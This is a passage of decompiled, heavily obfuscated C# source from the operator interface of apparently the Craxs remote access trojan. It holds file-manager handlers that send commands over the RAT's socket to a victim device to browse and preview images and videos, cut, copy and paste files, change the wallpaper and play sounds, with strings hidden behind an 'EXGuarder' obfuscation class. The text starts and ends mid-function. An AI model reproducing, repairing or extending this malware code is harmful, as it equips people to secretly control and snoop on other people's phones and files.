                    {
                      case 1:
                        this.viwimage.Image = (Image) null;
                        num11 = (int) num12 * -990641473 ^ 1507096092;
                        continue;
                      case 2:
                        this.viwimage.Image.Dispose();
                        num11 = (int) num12 * -795846993 ^ 1850544382;
                        continue;
                      case 3:
                        goto label_39;
                      default:
                        goto label_68;
                    }
                  }
                }
                else
                  goto label_68;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
label_46:
                int num13 = -1753780259;
                while (true)
                {
                  uint num14;
                  switch ((num14 = (uint) (-~(num13 - ---(-393274989 - -1207326288 ^ --1475862109)) - 1035215043 * (-1952955093 - 1774272557))) % 3U)
                  {
                    case 0:
                      goto label_46;
                    case 1:
                      ProjectData.ClearProjectError();
                      num13 = (int) num14 * -1643987100 ^ 1555029261;
                      continue;
                    default:
                      goto label_68;
                  }
                }
              }
            }
          }
          else
            goto label_74;
label_51:
          if (flag)
            goto label_54;
label_52:
          int num15 = -1700177373;
label_53:
          string str3;
          object obj;
          string[] strArray;
          object[] ParametersObjects;
          while (true)
          {
            uint num16;
            switch ((num16 = (uint) (-~(num15 - ---(-393274989 - -1207326288 ^ --1475862109)) - 1035215043 * (-1952955093 - 1774272557))) % 22U)
            {
              case 0:
                goto label_52;
              case 1:
                obj = (object) EXGuarder.\u0033B196B03;
                num15 = 2033827022;
                continue;
              case 2:
                str3 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value);
                num15 = (int) num16 * -1828667885 ^ 2127101264;
                continue;
              case 3:
                int num17 = ((Jector) this).classClient == null ? -825818840 : (num17 = 52551783);
                num15 = num17 ^ (int) num16 * 1988425401;
                continue;
              case 4:
                goto label_68;
              case 5:
                obj = (object) EXGuarder.\u0033B196B03;
                num15 = (int) num16 * 1127313662 ^ -414794211;
                continue;
              case 6:
                int num18 = !this.ISupportedImages(str3.ToLower()) ? 1305319792 : (num18 = 971576263);
                num15 = num18 ^ (int) num16 * -231420617;
                continue;
              case 7:
                ((Jector) this).classClient.SendMessage(ParametersObjects);
                num15 = (int) num16 * -1330452236 ^ 927352967;
                continue;
              case 8:
                goto label_57;
              case 9:
                int num19;
                num15 = num19 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, (object) EXGuarder.\u0033B196B03, false))) ? 1543119227 : (num19 = -1464376026);
                continue;
              case 10:
                num15 = (int) num16 * 2146733568 ^ -466449202;
                continue;
              case 11:
                obj = (object) EXGuarder.\u003792F2710;
                num15 = (int) num16 * 805649747 ^ 679897832;
                continue;
              case 12:
                goto label_72;
              case 13:
                goto label_50;
              case 14:
                goto label_58;
              case 15:
                strArray = ((Data) ((Jector) this).classClient).Keys.Split(':');
                num15 = (int) num16 * -1385288216 ^ 979395521;
                continue;
              case 16:
                this.viwimage.Visible = true;
                num15 = (int) num16 * -71413509 ^ -353926352;
                continue;
              case 17:
                goto label_56;
              case 18:
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                ParametersObjects = new object[4]
                {
                  (object) ((Jector) this).Client,
                  Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0032E623F67 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003023F136D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00371375971 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), obj), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) ((Jector) this).Q), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_DATA), (object) Accept.ImageViewer), (object) (EXGuarder.\u00347162778 + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID)),
                  (object) Codes.Encoding().GetBytes(EXGuarder.\u0033B196B03),
                  (object) ((Jector) this).classClient
                };
                num15 = (int) num16 * 1763773689 ^ 1034298648;
                continue;
              case 19:
                int num20;
                num15 = num20 = !this.ISupportedVideo(str3.ToLower()) ? 1624385740 : (num20 = -1529906780);
                continue;
              case 20:
                obj = (object) EXGuarder.\u0034F5A3E2A;
                num15 = (int) num16 * 976768139 ^ -1130455734;
                continue;
              case 21:
                goto label_41;
              default:
                goto label_32;
            }
          }
label_56:
          flag = true;
          goto label_51;
label_58:
          checked { index += -1; }
          goto label_13;
label_68:
          this.viwimage.Image = (Image) Codes.ReadBitmapFromFile(((Jector) this).FileDirectory + EXGuarder.\u0036A2D1B46 + str1.Substring(checked (str1.LastIndexOf(EXGuarder.\u0032A1B2D67) + 1)));
          num15 = -1297168753;
          goto label_53;
label_72:
          this.viwimage.Image = (Image) null;
          num15 = 1543119227;
          goto label_53;
        }
label_44:
        return;
label_74:
        return;
label_54:
        return;
label_57:
        return;
label_50:
        return;
label_41:
        return;
label_32:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Sub_Clipboard(string pram)
    {
      if (Operators.CompareString(pram, EXGuarder.\u0034E45270B, false) == 0 & ((Jector) this).Clipboard.Count > 0)
      {
        string Right = this.Format_Space(Conversions.ToString(this.DGV0.Tag));
        string Left = EXGuarder.\u00317327117;
        List<Array>.Enumerator enumerator;
        try
        {
          enumerator = ((Jector) this).Clipboard.GetEnumerator();
label_3:
          int num1 = -84789708;
          while (true)
          {
            int num2 = num1;
            uint num3;
            Array Instance;
            Array current;
            switch ((num3 = (uint) ((1708634763 * 1533229698 - (num2 ^ 1783683575 * ~(-1170798723 * ~(-645331912 - 651129907))) ^ 1988061604 + ((-419247113 ^ -501107222) + (2117401208 - 44901519)) ^ ~(-1351522654 - 333275819)) - ~1665809549 - -1343647110)) % 9U)
            {
              case 1:
                int num4;
                num1 = num4 = enumerator.MoveNext() ? 218646844 : (num4 = -67883729);
                continue;
              case 2:
                goto label_3;
              case 3:
                num1 = (int) num3 * 820458279 ^ -410580711;
                continue;
              case 4:
                Left = Conversions.ToString(Operators.ConcatenateObject((object) Left, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 3
                }, (string[]) null), (object) Strings.Space(1)), NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 2
                }, (string[]) null)), (object) Strings.Space(1)), (object) Right)));
                num1 = -860814261;
                continue;
              case 5:
                Left = Conversions.ToString(Operators.ConcatenateObject((object) Left, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Strings.Space(1) + EXGuarder.\u0035A140A35 + Strings.Space(1)), NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 3
                }, (string[]) null)), (object) Strings.Space(1)), NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 2
                }, (string[]) null)), (object) Strings.Space(1)), (object) Right)));
                num1 = (int) num3 * 1190158026 ^ -1394003945;
                continue;
              case 6:
                Instance = current;
                int num5 = Left.Length == 0 ? -674092282 : (num5 = 914251709);
                num1 = num5 ^ (int) num3 * 2005444979;
                continue;
              case 7:
                num1 = (int) num3 * -1004029916 ^ 964380303;
                continue;
              case 8:
                current = enumerator.Current;
                num1 = -768639762;
                continue;
              default:
                goto label_14;
            }
          }
        }
        finally
        {
          enumerator.Dispose();
        }
label_14:
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((Jector) this).classClient.SendMessage(new object[4]
        {
          (object) ((Jector) this).Client,
          (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0034E59106C + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00349276A0D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036340672C + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + Left),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u003592B1172),
          (object) ((Jector) this).classClient
        });
        ((Jector) this).Clipboard.Clear();
      }
      else
        goto label_22;
label_15:
      int num6 = 912456199;
label_16:
      while (true)
      {
        int num7 = num6;
        uint num8;
        bool flag;
        int index;
        string prm;
        string Left;
        int num9;
        switch ((num8 = (uint) ((1708634763 * 1533229698 - (num7 ^ 1783683575 * ~(-1170798723 * ~(-645331912 - 651129907))) ^ 1988061604 + ((-419247113 ^ -501107222) + (2117401208 - 44901519)) ^ ~(-1351522654 - 333275819)) - ~1665809549 - -1343647110)) % 22U)
        {
          case 0:
            prm = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u0033F3F5854), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            num6 = (int) num8 * 509309409 ^ 1149973343;
            continue;
          case 1:
            num6 = (int) num8 * 1250051824 ^ 276528042;
            continue;
          case 2:
            int num10 = Operators.CompareString(Left, EXGuarder.\u00336041F0B, false) != 0 ? -524260276 : (num10 = -488157304);
            num6 = num10 ^ (int) num8 * -733185249;
            continue;
          case 3:
            int num11;
            num6 = num11 = Operators.CompareString(pram, EXGuarder.\u00343295B4B, false) != 0 ? 1857070697 : (num11 = 391920427);
            continue;
          case 4:
            checked { index += -1; }
            num6 = -617578598;
            continue;
          case 5:
            flag = true;
            num6 = (int) num8 * 1763858547 ^ -407643563;
            continue;
          case 6:
            flag = false;
            num6 = (int) num8 * -338268694 ^ -825615873;
            continue;
          case 7:
            flag = false;
            num6 = 327655702;
            continue;
          case 8:
            goto label_22;
          case 9:
            ((Jector) this).Clipboard.Add((Array) new object[4]
            {
              (object) pram,
              (object) flag,
              (object) this.Format_Space(prm),
              (object) EXGuarder.\u00360050779
            });
            num6 = 1846735909;
            continue;
          case 10:
            int num12 = this.DGV0.SelectedRows.Count <= 0 ? -1351215638 : (num12 = 1467585050);
            num6 = num12 ^ (int) num8 * 843931287;
            continue;
          case 11:
            int num13;
            num6 = num13 = index >= 0 ? -410464792 : (num13 = -1771673338);
            continue;
          case 12:
            index = num9;
            num6 = (int) num8 * 1747541329 ^ 441907834;
            continue;
          case 13:
            ((Jector) this).Clipboard.Add((Array) new object[4]
            {
              (object) pram,
              (object) flag,
              (object) this.Format_Space(prm),
              (object) EXGuarder.\u00361191D68
            });
            num6 = (int) num8 * 2128058222 ^ 1479333324;
            continue;
          case 14:
            int num14 = !flag ? -2053009602 : (num14 = 1296063122);
            num6 = num14 ^ (int) num8 * -1935389768;
            continue;
          case 15:
            goto label_17;
          case 16:
            goto label_15;
          case 17:
            num9 = checked (this.DGV0.SelectedRows.Count - 1);
            num6 = (int) num8 * -531371202 ^ 351692587;
            continue;
          case 18:
            ((Jector) this).Clipboard.Add((Array) new object[4]
            {
              (object) pram,
              (object) flag,
              (object) this.Format_Space(prm),
              (object) EXGuarder.\u00371621E38
            });
            num6 = 1846735909;
            continue;
          case 19:
            Left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag);
            int num15;
            num6 = num15 = Operators.CompareString(Left, EXGuarder.\u003525A0A17, false) == 0 ? 1846735909 : (num15 = 91203059);
            continue;
          case 20:
            num6 = (int) num8 * -1901203624 ^ -1262017882;
            continue;
          case 21:
            num6 = (int) num8 * 165229227 ^ 1617573616;
            continue;
          default:
            goto label_12;
        }
      }
label_17:
      return;
label_12:
      return;
label_22:
      ((Jector) this).Clipboard.Clear();
      num6 = -544256513;
      goto label_16;
    }

    private string Format_Space(string prm)
    {
      if (prm.Contains(Strings.Space(1)))
      {
label_1:
        int num1 = 538331668;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (490514445 - (1563311148 - (-num2 - (-278391707 * ~(568457167 - 687389049) - 235733490) + (~720178445 * -1798059413 + ((198762231 ^ -1594849918) - ~-387359294)))) ^ 2104108960)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              prm = prm.Replace(Strings.Space(1), EXGuarder.\u0031B50005C.ToLower());
              num1 = (int) num3 * 2087463719 ^ 93528035;
              continue;
            default:
              goto label_4;
          }
        }
      }
label_4:
      return prm;
    }

    private void CutToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.Sub_Clipboard(EXGuarder.\u003313B0936);
    }

    private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.Sub_Clipboard(EXGuarder.\u0033B5E0275);
    }

    private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Jector) this).Clipboard.Count == 0)
        return;
label_1:
      int num1 = -1327172810;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((((~(--1910479284 * -1933770607 - (-999383791 - -1082974618)) ^ -422549739 * ((1105512131 - -84280872) * -198484613 ^ -(-243033704 - 514750166))) - num2 - (-494303257 * 1498952385 ^ ~--18197937 ^ 1542380623 * 644143413) - -1618090017 * ~(-1530400201 * 1404498241)) * 1016450083 ^ 1930475304 ^ 328578473) * 1688514539)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            this.Sub_Clipboard(EXGuarder.\u00358531D32);
            num1 = (int) num3 * -1326273404 ^ -1407638423;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void SetWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -554783573;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        string str;
        switch ((num3 = (uint) (-1624243966 - ~(-(num2 + ~(-356769711 * -1082554054 + (1789373561 + 873995519) - ~~-2091492356 + (-790352791 - (-1699115678 ^ 1037638976 ^ ~872268923)))) + 104512703) * 1103097943)) % 10U)
        {
          case 0:
            goto label_1;
          case 1:
            int num4;
            num1 = num4 = index >= 0 ? -199194197 : (num4 = -1856181216);
            continue;
          case 2:
            goto label_12;
          case 3:
            int num5;
            num1 = num5 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag, (object) EXGuarder.\u0035E455D35, false))) ? -331408932 : (num5 = 1519378279);
            continue;
          case 4:
            int num6 = ((Jector) this).classClient == null ? -1698709052 : (num6 = -646786982);
            num1 = num6 ^ (int) num3 * 222598804;
            continue;
          case 5:
            num1 = (int) num3 * 1761170338 ^ -1310896919;
            continue;
          case 6:
            checked { index += -1; }
            num1 = 1209056775;
            continue;
          case 7:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * 1918744213 ^ -1640140928;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Jector) this).classClient.SendMessage(new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00350173059 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00360311104 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032D390375 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0035C0B1466),
              (object) ((Jector) this).classClient
            });
            num1 = (int) num3 * -1893675267 ^ 1077398878;
            continue;
          case 9:
            string Right = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value);
            str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00355165122), (object) Right));
            num1 = (int) num3 * -1973413237 ^ 531960187;
            continue;
          default:
            goto label_13;
        }
      }
label_12:
      return;
label_13:;
    }

    private void PlaySoundToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1416414967;
      object[] ParametersObjects;
      int index;
      string str;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ((-num1 - (183717910 + 1230649863 * (-920518707 * 682291869) - (1055861542 - 933872937 ^ ~1521333063 ^ -1901281488 * 1859428427 ^ -1726704288)) - 1910350805 ^ -1947966791 - 750743289 - (246951827 - 1939071617) ^ 723619565 * -2050407661) * 456141693)) % 11U)
        {
          case 0:
            goto label_13;
          case 1:
            index = num2;
            num1 = (int) num3 * 565319337 ^ -239458674;
            continue;
          case 2:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -496419500 ^ 930276513;
            continue;
          case 3:
            goto label_1;
          case 4:
            ((Jector) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 1046793185 ^ 826813829;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Jector) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00351160326 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030751016E + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032C6F1277 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00349366730),
              (object) ((Jector) this).classClient
            };
            num1 = (int) num3 * -811540175 ^ 1425149815;
            continue;
          case 6:
            int num4 = ((Jector) this).classClient == null ? 291095143 : (num4 = 1196256985);
            num1 = num4 ^ (int) num3 * 707037247;
            continue;
          case 7:
            checked { index += -1; }
            num1 = -1477004203;
            continue;
          case 8:
            int num5;
            num1 = num5 = index >= 0 ? 390084952 : (num5 = 1229419175);
            continue;
          case 9:
            int num6;
            num1 = num6 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag, (object) EXGuarder.\u003371F494E, false))) ? -914871971 : (num6 = -1367993495);
            continue;
          case 10:
            string Right = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value);
            str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u00337277071), (object) Right));
            num1 = (int) num3 * 361023195 ^ 1851700305;
            continue;
          default:
            goto label_14;
        }
      }
label_13:
      return;
label_14:;
    }

    private void ctxMenu_Opening(object sender, CancelEventArgs e)
    {
      string ver = ((Jector) this).ver;
label_1:
      int num1 = 1068632823;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(~(num1 * -29521979) * -1991138703)) % 5U)
        {
          case 0:
            this.SetWallpaperToolStripMenuItem.Visible = false;
            num1 = 1822255447;
            continue;
          case 1:
            goto label_3;
          case 2:
            this.SetWallpaperToolStripMenuItem.Visible = true;
            num1 = (int) num2 * -988173685 ^ -1910709092;
            continue;
          case 3:
            goto label_1;
          case 4:
            int num3 = Operators.CompareString(ver, EXGuarder.\u00305006373, false) == 0 ? -1852746185 : (num3 = -1183193312);
            num1 = num3 ^ (int) num2 * 715515164;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void FileManager_FormClosing(object sender, FormClosingEventArgs e)
    {
      uint num1;
      if (this.DGVDATA.Rows.Count > 0)
      {
        int num2 = 0;
        IEnumerator enumerator;
        try
        {
          enumerator = ((IEnumerable) this.DGVDATA.Rows).GetEnumerator();
label_3:
          int num3 = 1019121976;
          DataGridViewRow current;
          while (true)
          {
            uint num4;
            switch ((num4 = (uint) (((--num3 - (555178039 * 59381509 - (-1347673873 * 73040136 + 595842450))) * 1326434771 - ~233101269) * -1297205785)) % 9U)
            {
              case 0:
                int num5;
                num3 = num5 = enumerator.MoveNext() ? -1549601638 : (num5 = 190424065);
                continue;
              case 2:
                num3 = (int) num4 * 614767206 ^ 732351802;
                continue;
              case 3:
                goto label_3;
              case 4:
                num3 = (int) num4 * 1059587592 ^ -1624499845;
                continue;
              case 5:
                num2 = 1;
                num3 = -1180844714;
                continue;
              case 6:
                int num6 = Operators.CompareString(current.Tag.ToString(), EXGuarder.\u00303163215, false) != 0 ? 1413081128 : (num6 = -2038167903);
                num3 = num6 ^ (int) num4 * 1973020043;
                continue;
              case 7:
                int num7 = current.Tag.ToString().Length <= 1 ? 1753014593 : (num7 = -263297465);
                num3 = num7 ^ (int) num4 * 426341659;
                continue;
              case 8:
                current = (DataGridViewRow) enumerator.Current;
                num3 = -1952622699;
                continue;
              default:
                goto label_17;
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable)
          {
label_13:
            int num8 = -1389344191;
            while (true)
            {
              uint num9;
              switch ((num9 = (uint) (((--num8 - (555178039 * 59381509 - (-1347673873 * 73040136 + 595842450))) * 1326434771 - ~233101269) * -1297205785)) % 3U)
              {
                case 1:
                  (enumerator as IDisposable).Dispose();
                  num8 = (int) num9 * -936098614 ^ -190666881;
                  continue;
                case 2:
                  goto label_13;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
label_17:
        if (num2 > 0)
        {
          try
          {
            if (!Codes.MyMsgBox(EXGuarder.\u00363382248, EXGuarder.\u0034F19576A, true, Craxs_Rat.My.Resources.Resources.warning48px))
            {
label_19:
              switch ((num1 = (uint) (((--1197488832 - (555178039 * 59381509 - (-1347673873 * 73040136 + 595842450))) * 1326434771 - ~233101269) * -1297205785)) % 3U)
              {
                case 0:
                  goto label_19;
                case 2:
                  e.Cancel = true;
                  return;
              }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      this.Timer1.Stop();
      this.Timer2.Stop();
label_23:
      int num10 = -382639431;
      int num11;
      int Index;
      while (true)
      {
        uint num12;
        switch ((num12 = (uint) (((--num10 - (555178039 * 59381509 - (-1347673873 * 73040136 + 595842450))) * 1326434771 - ~233101269) * -1297205785)) % 5U)
        {
          case 1:
            num11 = checked (((Jector) this).DownStreams.Count - 1);
            num10 = (int) num12 * -2027466982 ^ 278239517;
            continue;
          case 2:
            Index = 0;
            num10 = (int) num12 * 1034913479 ^ -1941863231;
            continue;
          case 3:
            ((Jector) this).Correntindex = 1;
            num10 = (int) num12 * 264682256 ^ 734758270;
            continue;
          case 4:
            goto label_23;
          default:
            goto label_28;
        }
      }
label_28:
      while (Index <= num11)
      {
        try
        {
          if (((Jector) this).DownStreams[Index] != null)
          {
label_30:
            int num13 = 2130391188;
            FileStream fileStream;
            while (true)
            {
              uint num14;
              switch ((num14 = (uint) (((--num13 - (555178039 * 59381509 - (-1347673873 * 73040136 + 595842450))) * 1326434771 - ~233101269) * -1297205785)) % 6U)
              {
                case 0:
                  fileStream.Dispose();
                  num13 = (int) num14 * -1106187321 ^ -1214300284;
                  continue;
                case 1:
                  fileStream = (FileStream) NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(((Jector) this).DownStreams[Index]), new object[1]
                  {
                    (object) 0
                  }, (string[]) null);
                  num13 = (int) num14 * -433957500 ^ 1324283087;
                  continue;
                case 2:
                  goto label_30;
                case 3:
                  fileStream.Close();
                  num13 = (int) num14 * -1437790281 ^ -2129752523;
                  continue;
                case 4:
                  int num15 = fileStream == null ? 665580270 : (num15 = -184123717);
                  num13 = num15 ^ (int) num14 * 220422133;
                  continue;
                default:
                  goto label_42;
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_37:
          int num16 = 369296561;
          while (true)
          {
            uint num17;
            switch ((num17 = (uint) (((--num16 - (555178039 * 59381509 - (-1347673873 * 73040136 + 595842450))) * 1326434771 - ~233101269) * -1297205785)) % 3U)
            {
              case 0:
                goto label_37;
              case 2:
                ProjectData.ClearProjectError();
                num16 = (int) num17 * -102970342 ^ 885213542;
                continue;
              default:
                goto label_42;
            }
          }
        }
label_42:
        checked { ++Index; }
label_43:
        switch ((num1 = (uint) (((---587117094 - (555178039 * 59381509 - (-1347673873 * 73040136 + 595842450))) * 1326434771 - ~233101269) * -1297205785)) % 3U)
        {
          case 0:
            goto label_43;
          case 1:
            continue;
          case 2:
            return;
          default:
            return;
        }
      }
    }

    private void Pathtxt_SizeChanged(object sender, EventArgs e)
    {
      try
      {
        this.PB.Size = this.pathtxt.Size;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = 1701983270;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(1151455341 * -615341414 - ((~(num2 ^ ~-(~~1735274218 ^ -972664608)) ^ 1544069867 * (532033351 - 1896919220 + --470346010)) - -393375015))) % 3U)
          {
            case 0:
              goto label_4;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num3 * -1825903938 ^ -820277556;
              continue;
            case 2:
              goto label_2;
            default:
              goto label_6;
          }
        }
label_4:
        return;
label_6:;
      }
    }

    private void LoadVideo()
    {
      if (this.DGV0.SelectedRows.Count != 1)
        return;
label_1:
      int num1 = 2125508061;
      int index;
      string str1;
      object obj;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((~(num1 * 1004050643 * 179833313) - 591569204) * 2124312867)) % 23U)
        {
          case 0:
            int num3;
            num1 = num3 = index >= 0 ? 94492089 : (num3 = 1304274772);
            continue;
          case 1:
            this.thumb_chk.Checked = false;
            num1 = (int) num2 * 2004032049 ^ 1661934967;
            continue;
          case 2:
            int num4;
            num1 = num4 = !Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, (object) EXGuarder.\u0031E65044D, false))) ? -1475358865 : (num4 = -1644092216);
            continue;
          case 3:
            checked { index += -1; }
            num1 = -39236320;
            continue;
          case 4:
            int num5 = !this.ISupportedImages(str2.ToLower()) ? 1594311451 : (num5 = 1335335764);
            num1 = num5 ^ (int) num2 * -1943186536;
            continue;
          case 5:
            int num6 = !str1.Substring(checked (str1.LastIndexOf(EXGuarder.\u0030E37112C) + 1)).EndsWith(EXGuarder.\u00367611625) ? -1020996928 : (num6 = 812498689);
            num1 = num6 ^ (int) num2 * 1884933949;
            continue;
          case 6:
            int num7;
            num1 = num7 = !this.ISupportedVideo(str2.ToLower()) ? 315290706 : (num7 = -1623688499);
            continue;
          case 7:
            obj = (object) EXGuarder.\u0031E65044D;
            num1 = -1397659092;
            continue;
          case 8:
            ((Jector) this).ShowVideo = true;
            num1 = (int) num2 * 575658206 ^ -494074846;
            continue;
          case 9:
            num1 = (int) num2 * -303989797 ^ 2134837477;
            continue;
          case 10:
            obj = (object) EXGuarder.\u003484A4755;
            num1 = (int) num2 * 1822174579 ^ 1283575813;
            continue;
          case 11:
            this.viwimage.Image = (Image) null;
            num1 = -1475358865;
            continue;
          case 12:
            int num8 = ((Jector) this).classClient == null ? -2113534247 : (num8 = 93215771);
            num1 = num8 ^ (int) num2 * -901170022;
            continue;
          case 13:
            int num9;
            num1 = num9 = Operators.CompareString(Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[0].Tag), EXGuarder.\u0034C385823, false) != 0 ? 437314063 : (num9 = -2004674440);
            continue;
          case 14:
            str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, (object) EXGuarder.\u0030E37112C), this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value));
            num1 = (int) num2 * 546862376 ^ 681474682;
            continue;
          case 15:
            obj = (object) EXGuarder.\u0035E401C70;
            num1 = (int) num2 * -96572464 ^ 2112776044;
            continue;
          case 16:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num2 * 1531846074 ^ 124308456;
            continue;
          case 17:
            this.thumb_chk.Refresh();
            str2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[1].Value);
            obj = (object) EXGuarder.\u0031E65044D;
            num1 = (int) num2 * -1620921217 ^ -2097124332;
            continue;
          case 18:
